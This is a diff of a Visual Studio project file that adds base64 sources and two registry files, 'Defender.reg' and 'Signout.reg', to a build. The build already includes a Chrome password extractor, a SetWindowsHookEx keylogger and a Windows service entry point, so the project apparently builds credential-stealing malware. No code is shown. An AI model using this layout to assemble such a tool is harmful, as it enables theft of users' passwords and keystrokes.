@@ -152,17 +152,23 @@
     <Text Include="ReadMe.txt" />
   </ItemGroup>
   <ItemGroup>
+    <ClInclude Include="base64\base64.h" />
     <ClInclude Include="chrome-passwords\src\sqlite3.h" />
     <ClInclude Include="chrome-passwords\src\targetver.h" />
     <ClInclude Include="stdafx.h" />
     <ClInclude Include="targetver.h" />
   </ItemGroup>
   <ItemGroup>
+    <ClCompile Include="base64\base64.cpp" />
     <ClCompile Include="chrome-passwords\src\chrome-passwords.cpp" />
     <ClCompile Include="chrome-passwords\src\sqlite3.c" />
     <ClCompile Include="SampleServiceMain.cpp" />
     <ClCompile Include="SetWindowsHookEx-Keylogger.cpp" />
     <ClCompile Include="stdafx.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Defender.reg" />
+    <None Include="Signout.reg" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
